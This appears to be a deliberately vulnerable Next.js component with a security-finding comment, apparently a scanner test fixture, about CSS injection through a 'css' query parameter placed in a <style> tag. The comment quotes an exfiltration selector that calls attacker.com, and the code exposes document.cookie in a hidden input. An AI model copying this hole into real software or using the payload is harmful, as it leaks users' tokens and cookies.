// [frensense]
// observation: User-controlled input is interpolated directly into a `<style>` tag within a React component. This allows injecting arbitrary CSS rules, including CSS selectors that exfiltrate data via background-image URLs (e.g., `input[value^="a"] { background: url(https://attacker.com/steal?a) }`).
// impact: An attacker can inject CSS selectors that read attribute values character by character (using `^=` prefix selectors with background-image URLs) to exfiltrate CSRF tokens, API keys, or other sensitive data embedded in the DOM. CSS injection can also deface the page, inject phishing overlays, or hide legitimate content.
// improvement: Never interpolate user input into `<style>` tags. Use CSS-in-JS libraries with proper sanitization, or apply styles via className mapping with allowlisted values.

'use client';

import { useSearchParams } from 'next/navigation';

export function CustomStyles() {
  const searchParams = useSearchParams();
  const userCss = searchParams.get('css') ?? '';

  return (
    <div>
      <style>{userCss}</style>
      <div className="p-4">
        <h2>User Profile</h2>
        <input type="hidden" id="csrf" value={document.cookie ?? ''} />
      </div>
    </div>
  );
}
